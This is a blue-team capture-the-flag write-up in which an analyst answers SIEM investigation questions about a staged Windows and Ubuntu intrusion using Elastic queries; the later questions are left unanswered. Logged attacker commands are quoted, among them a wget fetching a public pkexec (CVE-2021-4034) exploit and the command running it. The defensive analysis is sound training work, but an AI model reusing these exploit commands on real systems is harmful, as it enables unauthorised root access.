https://cyberdefenders.org/blueteam-ctf-challenges/elasticcase/

Scenario:


>An attacker was able to trick an employee into downloading a suspicious file and running it. The attacker compromised the system, along with that, The Security Team did not update most systems. The attacker was able to pivot to another system and compromise the company. As a SOC analyst, you are assigned to investigate the incident using Elastic as a SIEM tool and help the team to kick out the attacker.


**Q1: Who downloads the malicious file which has a double extension?**


Given the information, we can safely assume the file will live in C:\Users\\\<user\>\Downloads\, so I use this to filter the path and search Sysmon Event ID 11 (File Created):


```
event.code: 11 AND file.path: *Downloads\\*.*.*
```


Fortunately for us, the first row appears to be the right answer. There's 70 total hits by the "cybery" user, although these appear to be false positives (results truncated for brevity):

| Time                       | host.hostname   | winlog.event_data.User | file.name                                                   | file.path                                                                             |
| -------------------------- | --------------- | ---------------------- | ----------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| Feb 2, 2022 @ 15:33:48.072 | DESKTOP-Q1SL9P2 | DESKTOP-Q1SL9P2\ahmed  | Acount_details.pdf.exe:Zone.Identifier                      | C:\Users\ahmed\Downloads\Acount_details.pdf.exe:Zone.Identifier                       |
| Feb 2, 2022 @ 05:29:44.951 | DESKTOP-Q1SL9P2 | DESKTOP-Q1SL9P2\cybery | elastic-agent-7.16.3-windows-x86_64.zip:Zone.Identifier     | C:\Users\cybery\Downloads\elastic-agent-7.16.3-windows-x86_64.zip:Zone.Identifier     |
| Feb 2, 2022 @ 05:21:58.142 | DESKTOP-Q1SL9P2 | DESKTOP-Q1SL9P2\cybery | elastic-agent-7.17.0-windows-x86_64 (1).zip:Zone.Identifier | C:\Users\cybery\Downloads\elastic-agent-7.17.0-windows-x86_64 (1).zip:Zone.Identifier |

**Q2: What is the hostname he was using?**


See above.


**Q3: What is the name of the malicious file?**


See the answer to Q1.


**Q4: What is the attacker's IP address?**

Given the information so far, I start by pivoting on the user that's known to have downloaded the file, and quickly confirm that they've launched it (Sysmon Event ID 1: Process Created):


```
host.hostname: "DESKTOP-Q1SL9P2" AND @timestamp > "2022-02-02T15:33:48.072Z" AND event.code: 1 AND process.name:  "Acount_details.pdf.exe" 
```


| Time                    | winlog.event_data.ParentUser | process.pid | process.command_line                                  |
|-------------------------|------------------------------|-------------|------------------------------------------------------|
| Feb 2, 2022 @ 15:35:21.260 | DESKTOP-Q1SL9P2\ahmed       | 13596       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe"     |
| Feb 2, 2022 @ 16:51:19.533 | DESKTOP-Q1SL9P2\cybery      | 13244       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe"     |
| Feb 2, 2022 @ 16:54:06.270 | DESKTOP-Q1SL9P2\cybery      | 2128        | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe"     |
| Feb 2, 2022 @ 16:54:25.983 | DESKTOP-Q1SL9P2\cybery      | 6432        | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe"     |
| Feb 2, 2022 @ 16:54:44.445 | DESKTOP-Q1SL9P2\cybery      | 12460       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe"     |
| Feb 2, 2022 @ 16:54:51.208 | DESKTOP-Q1SL9P2\cybery      | 8276        | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe"     |
| Feb 2, 2022 @ 16:55:38.866 | DESKTOP-Q1SL9P2\cybery      | 2508        | Acount_details.pdf.exe                                |
| Feb 2, 2022 @ 16:56:36.302 | DESKTOP-Q1SL9P2\cybery      | 6608        | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe"     |


Then, I pivot with their username and review network events (Sysmon Event ID 3: Network connection detected) that follow when download of the malicious file:

```
host.hostname: "DESKTOP-Q1SL9P2" AND @timestamp > "2022-02-02T15:33:48.072Z" AND event.code: 3
```

There are 166 hits (results truncated, 160/166 of them look like this):

| Time                       | host.hostname   | winlog.process.pid | process.executable                              | source.ip     | source.port | destination.ip | destination.port |
| -------------------------- | --------------- | ------------------ | ----------------------------------------------- | ------------- | ----------- | -------------- | ---------------- |
| Feb 2, 2022 @ 15:35:23.358 | DESKTOP-Q1SL9P2 | 2,496              | C:\Users\ahmed\Downloads\Acount_details.pdf.exe | 192.168.10.10 | 50449       | 192.168.1.10   | 443              |

While scrolling through the table, I noticed a few suspicious rows and made a note of them:

| Time                    | host.hostname   | winlog.process.pid | process.executable                                         | source.ip       | source.port | destination.ip | destination.port |
|-------------------------|-----------------|--------------------|------------------------------------------------------------|-----------------|-------------|----------------|------------------|
| Feb 2, 2022 @ 16:58:17.574 | DESKTOP-Q1SL9P2 | 2,496              | C:\Windows\System32\rundll32.exe                            | 192.168.10.10   | 51238       | 192.168.1.10   | 4444             |
| Feb 2, 2022 @ 17:14:22.749 | DESKTOP-Q1SL9P2 | 2,496              | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe   | 192.168.10.10   | 51372       | 192.168.10.30  | 22               |
| Feb 2, 2022 @ 17:14:28.947 | DESKTOP-Q1SL9P2 | 2,496              | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe   | 192.168.10.10   | 51376       | 192.168.10.30  | 22               |

The remaining rows were OneDrive and VMWare activity, which didn't appear anomalous. For your reference, here is OneDrive:

| Time                       | host.hostname   | winlog.process.pid | process.executable                                            | source.ip     | source.port | destination.ip | destination.port |
| -------------------------- | --------------- | ------------------ | ------------------------------------------------------------- | ------------- | ----------- | -------------- | ---------------- |
| Feb 2, 2022 @ 18:00:55.550 | DESKTOP-Q1SL9P2 | 3,044              | C:\Users\cybery\AppData\Local\Microsoft\OneDrive\OneDrive.exe | 192.168.10.10 | 49841       | 40.126.17.132  | 443              |
| Feb 2, 2022 @ 18:00:55.551 | DESKTOP-Q1SL9P2 | 3,044              | C:\Users\cybery\AppData\Local\Microsoft\OneDrive\OneDrive.exe | 192.168.10.10 | 49842       | 40.126.17.132  | 443              |


And VMWare (most of the fields above were empty, so I'm printing the table here instead):

| Field                         | Value                                           |
|-------------------------------|-------------------------------------------------|
| _id                           | XxCZu34BE6-hyNVwajQy                            |
| _index                        | winlogbeat-7.17.0-2022.02.02-000001             |
| _score                        | -                                               |
| _type                         | _doc                                            |
| @timestamp                    | Feb 2, 2022 @ 17:47:57.764                      |
| agent.ephemeral_id            | 58014128-e500-4dad-a74a-0733646db0dd            |
| agent.hostname                | DESKTOP-Q1SL9P2                                 |
| agent.id                      | 7684ef28-1485-485c-9982-6482fc33c857            |
| agent.name                    | DESKTOP-Q1SL9P2                                 |
| agent.type                    | winlogbeat                                      |
| agent.version                 | 7.17.0                                          |
| ecs.version                   | 1.12.0                                          |
| event.code                    | 3                                               |
| event.created                 | Feb 2, 2022 @ 18:01:40.588                      |
| event.kind                    | event                                           |
| event.provider                | vmci                                            |
| host.architecture             | x86_64                                          |
| host.hostname                 | DESKTOP-Q1SL9P2                                 |
| host.id                       | 37e27d38-9197-4496-9105-b75e003bb01b            |
| host.ip                       | fe80::80fc:1377:52fb:977e, 192.168.10.10        |
| host.mac                      | 00:0c:29:86:b0:5c                               |
| host.name                     | DESKTOP-Q1SL9P2                                 |
| host.os.build                 | 19043.928                                       |
| host.os.family                | windows                                         |
| host.os.kernel                | 10.0.19041.928 (WinBuild.160101.0800)           |
| host.os.name                  | Windows 10 Education                            |
| host.os.platform              | windows                                         |
| host.os.type                  | windows                                         |
| host.os.version               | 10.0                                            |
| log.level                     | information                                     |
| message                       | VMCI: Using capabilities (0xc).                 |
| winlog.api                    | wineventlog                                     |
| winlog.channel                | System                                          |
| winlog.computer_name          | DESKTOP-Q1SL9P2                                 |
| winlog.event_data.Binary      | 00000000020028000000000003000840030008400000000000000000000000000000000000000000 |
| winlog.event_data.param2      | VMCI: Using capabilities (0xc).                 |
| winlog.event_id               | 3                                               |
| winlog.keywords               | Classic                                         |
| winlog.process.pid            | 4                                               |
| winlog.process.thread.id      | 188                                             |
| winlog.provider_name          | vmci                                            |
| winlog.record_id              | 1351                                            |


**Q5: Another user with high privilege runs the same malicious file. What is the username?**

I pivot using the Sysmon process created event, the known file path, exclude the known user, and the timestamp from initial download:

```
event.code: 1 AND process.executable: "C:\Users\ahmed\Downloads\Acount_details.pdf.exe" AND @timestamp > "2022-02-02T15:33:48.072Z" AND NOT related.user: "ahmed"
```

This is the complete result:

| Time                       | winlog.user.name | host.name       | related.user | process.command_line                              |
| -------------------------- | ---------------- | --------------- | ------------ | ------------------------------------------------- |
| Feb 2, 2022 @ 16:51:19.533 | SYSTEM           | DESKTOP-Q1SL9P2 | cybery       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe" |
| Feb 2, 2022 @ 16:54:06.270 | SYSTEM           | DESKTOP-Q1SL9P2 | cybery       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe" |
| Feb 2, 2022 @ 16:54:25.983 | SYSTEM           | DESKTOP-Q1SL9P2 | cybery       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe" |
| Feb 2, 2022 @ 16:54:44.445 | SYSTEM           | DESKTOP-Q1SL9P2 | cybery       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe" |
| Feb 2, 2022 @ 16:54:51.208 | SYSTEM           | DESKTOP-Q1SL9P2 | cybery       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe" |
| Feb 2, 2022 @ 16:55:38.866 | SYSTEM           | DESKTOP-Q1SL9P2 | cybery       | Acount_details.pdf.exe                            |
| Feb 2, 2022 @ 16:56:36.302 | SYSTEM           | DESKTOP-Q1SL9P2 | cybery       | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe" |


**Q6: The attacker was able to upload a DLL file of size 8704. What is the file name?**

As far as I know, file size isn't captured in typical Windows or Sysmon event logs. I looked around the various log sources, and logs-\* had a "file.size" field. Perfect! I ran the following query:

```
host.name: "DESKTOP-Q1SL9P2" AND file.size: 8704 AND file.name: *.dll
```


| Time                    | user.name | file.path                                          | process.pid | process.name           | process.command_line                                      |
|-------------------------|-----------|----------------------------------------------------|-------------|-------------------------|-----------------------------------------------------------|
| Feb 2, 2022 @ 16:58:12.489 | cybery    | C:\Users\cybery\AppData\Local\Temp\mCblHDgWP.dll   | 6608        | Acount_details.pdf.exe  | -                                                           |
| Feb 2, 2022 @ 16:58:12.527 | cybery    | C:\Users\cybery\AppData\Local\Temp\mCblHDgWP.dll   | 6608        | Acount_details.pdf.exe  | "C:\Users\ahmed\Downloads\Acount_details.pdf.exe"         |
| Feb 2, 2022 @ 16:58:17.211 | cybery    | C:\Users\cybery\AppData\Local\Temp\mCblHDgWP.dll   | 9372        | mmc.exe                 | "C:\Windows\system32\mmc.exe" "C:\Windows\System32\gpedit.msc" |


**Q7: What parent process name spawns cmd with NT AUTHORITY privilege and pid 10716?**

This one is relatively straightforward. Staying in logs-\*:

```
 process.pid: 10716
```

I added some additional fields for visual clarity:

| Time                    | user.name | process.pid | process.name  | process.command_line                           | winlog.event_data.ParentUser | process.parent.name |
|-------------------------|-----------|-------------|---------------|------------------------------------------------|-------------------------------|----------------------|
| Feb 2, 2022 @ 16:46:27.517 | ahmed    | 10716       | whoami.exe    | whoami                                         | DESKTOP-Q1SL9P2\ahmed         | cmd.exe              |
| Feb 2, 2022 @ 17:10:47.237 | SYSTEM   | 10716       | cmd.exe       | C:\Windows\system32\cmd.exe                    | DESKTOP-Q1SL9P2\cybery        | rundll32.exe         |
| Feb 2, 2022 @ 18:02:37.137 | SYSTEM   | 10716       | UsoClient.exe | C:\Windows\system32\usoclient.exe StartScan    | -                             | -                    |

**Q8: The previous process was able to access a registry. What is the full path of the registry?**

Given what we already know, I wrote this query for log source logs-\*:

```
process.pid: 10716 AND host.name: "DESKTOP-Q1SL9P2" AND @timestamp > "2022-02-02T15:33:48.072Z" AND registry.path: *
```

Which produced this result:

| Time                    | host.name      | user.name | process.name  | process.pid | registry.path                                                  |
|-------------------------|----------------|-----------|---------------|-------------|-----------------------------------------------------------------|
| Feb 2, 2022 @ 18:02:37.299 | DESKTOP-Q1SL9P2 | SYSTEM    | UsoClient.exe | 10716       | HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled |

**Q9: PowerShell process with pid 8836 changed a file in the system. What was that filename?**

This one required some review of the results following my query, as I wasn't exactly sure what field would be used to indicate a file was changed:

```
process.pid: 8836 AND @timestamp > "2022-02-02T15:33:48.072Z" AND host.name: "DESKTOP-Q1SL9P2" AND process.executable: *powershell* AND file.name:*
```

Turns out it was "event.type: change" (although it seems I could also have used "event.action: overwrite") in the log source logs-\*!

```
process.pid: 8836 AND @timestamp > "2022-02-02T15:33:48.072Z" AND host.name: "DESKTOP-Q1SL9P2" AND process.executable: *powershell* AND file.name:* AND event.type: "change" 
```

I've truncated some of the rows a bit here:

| Field                | Value                                                                                                   |
| -------------------- | ------------------------------------------------------------------------------------------------------- |
| @timestamp           | Feb 2, 2022 @ 17:12:54.597                                                                              |
| event.action         | overwrite                                                                                               |
| event.category       | file                                                                                                    |
| event.type           | change                                                                                                  |
| file.name            | ModuleAnalysisCache                                                                                     |
| file.path            | C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\ModuleAnalysisCache |
| file.size            | 55,723                                                                                                  |
| host.hostname        | DESKTOP-Q1SL9P2                                                                                         |
| host.ip              | 192.168.10.10, fe80::80fc:1377:52fb:977e, 127.0.0.1, ::1                                                |
| host.mac             | 00:0c:29:86:b0:5c                                                                                       |
| host.name            | DESKTOP-Q1SL9P2                                                                                         |
| message              | Endpoint file event                                                                                     |
| process.entity_id    | ZGRkOTM3YWEtOTQ0YS00ZmFiLWIzNjItZTM0NjJhODM0MWNjLTg4MzYtMTMyODgyOTU1NTUuOTAyMjcxMDAw                    |
| process.executable   | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                                               |
| process.Ext.ancestry | ZGRkOTM3YWEtOTQ0YS00ZmFiLWIzNjItZTM0NjJhODM0MWNj...                                                     |
| process.name         | powershell.exe                                                                                          |
| process.parent.pid   | 10716                                                                                                   |
| process.pid          | 8836                                                                                                    |
| user.domain          | NT AUTHORITY                                                                                            |
| user.id              | S-1-5-20                                                                                                |
| user.name            | NETWORK SERVICE                                                                                         |


**Q10: PowerShell process with pid 11676 created files with the ps1 extension. What is the first file that has been created?**

Modifying the above query a bit (added a search for the file extension, and Sysmon Event ID 11: File Created), I came up with the following:

```
process.pid: 11676 AND @timestamp > "2022-02-02T15:33:48.072Z" AND host.name: "DESKTOP-Q1SL9P2" AND process.executable: *powershell* AND file.extension:ps1 AND event.code: 11
```

There were two results:

| Time                    | file.path                                                 |
|-------------------------|-----------------------------------------------------------|
| Feb 2, 2022 @ 17:08:46.139 | C:\Windows\Temp\__PSScriptPolicyTest_bymwxuft.3b5.ps1  |
| Feb 2, 2022 @ 17:11:10.591 | C:\Windows\Temp\__PSScriptPolicyTest_nwg1htqg.4xd.ps1  |


**Q11: What is the machine's IP address that is in the same LAN as a windows machine?**

We've known the compromised host's IP address for some time. Using this, I assembled the following query:

```
host.ip: 192.168.10.0/24 AND NOT host.ip: 192.168.10.10
```

Looking at the Top Values visualisation with a frequency distribution:

![image](https://github.com/user-attachments/assets/c9a890d8-4562-43ca-9e41-cb40e4f8f1a9)


I attempted to use the IPv6 for the answer first, but that didn't work. The second IP was accepted.


**Q12: The attacker login to the Ubuntu machine after a brute force attack. What is the username he was successfully login with?**

First, I needed to find the Ubuntu machine in question using the log source logs-\*:

```
host.os.family: "ubuntu"
```

This machine is at 192.168.10.30, and the host.name is also "ubuntu".

Since this is a remote login to a Linux machine, its likely happening over SSH:

```
host.ip: 192.168.10.30 AND  @timestamp > "2022-02-02T15:33:48.072Z" AND system.auth.ssh.event: "Failed" 
```

This results in 140 hits, but there are some weird results for "user.name", such as "password147", "P@\$$W0rd!", and "test". Maybe somebody misconfigured their tool? Anyway, scrolling down further, I see the valid usernames "ahmed", "salem", and "admin". How do I know these are valid? I don't, actually, so I double check:

```
system.auth.ssh.event: "Invalid" 
```

And finally:

```
system.auth.ssh.event: "Accepted" 
```

After I add in the "user.name" column, there's multiple rows, but only one username that appears here.

**Q13: After that attacker downloaded the exploit from the GitHub repo using wget. What is the full URL of the repo?**


```
user.name: "salem" AND process.command_line: wget*
```


| Time                       | user.name | process.command_line                                                                 |
| -------------------------- | --------- | ------------------------------------------------------------------------------------ |
| Feb 2, 2022 @ 17:44:55.022 | salem     | wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py |
| Feb 2, 2022 @ 17:44:54.561 | salem     | wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py |


**Q14: After The attacker runs the exploit, which spawns a new process called pkexec, what is the process's md5 hash?**


```
user.name: "salem" AND process.command_line: "python3 CVE-2021-4034.py" 
```


| Time                       | user.name | process.pid | process.command_line     |
| -------------------------- | --------- | ----------- | ------------------------ |
| Feb 2, 2022 @ 17:45:06.410 | salem     | 3003        | python3 CVE-2021-4034.py |
| Feb 2, 2022 @ 17:45:06.528 | salem     | 3004        | python3 CVE-2021-4034.py |


```
process.name.caseless: "pkexec"
```


| Time                       | user.name | process.pid | process.hash.md5                 |
| -------------------------- | --------- | ----------- | -------------------------------- |
| Feb 2, 2022 @ 17:45:06.558 | root      | 3003        | 3a4ad518e9e404a6bad3d39dfebaf2f6 |
| Feb 2, 2022 @ 17:45:06.586 | root      | 3003        | 3a4ad518e9e404a6bad3d39dfebaf2f6 |
| Feb 3, 2022 @ 01:59:34.578 | root      | 3927        | 3d5b347ac0f858be29070c090c53d62f |
| Feb 3, 2022 @ 01:59:34.598 | root      | 3927        | 3d5b347ac0f858be29070c090c53d62f |


**Q15: Then attacker gets an interactive shell by running a specific command on the process id 3011 with the root user. What is the command?**



**Q16: What is the hostname which alert signal.rule.name: "Netcat Network Activity"?**



**Q17: What is the username who ran netcat?**



**Q18: What is the parent process name of netcat?**



**Q19: If you focus on nc process, you can get the entire command that the attacker ran to get a reverse shell. Write the full command?**



**Q20: From the previous three questions, you may remember a famous java vulnerability. What is it?**



**Q21: What is the entire log file path of the "solr" application?**



**Q22: What is the path that is vulnerable to log4j?**



**Q23: What is the GET request parameter used to deliver log4j payload?**



**Q24: What is the JNDI payload that is connected to the LDAP port?**

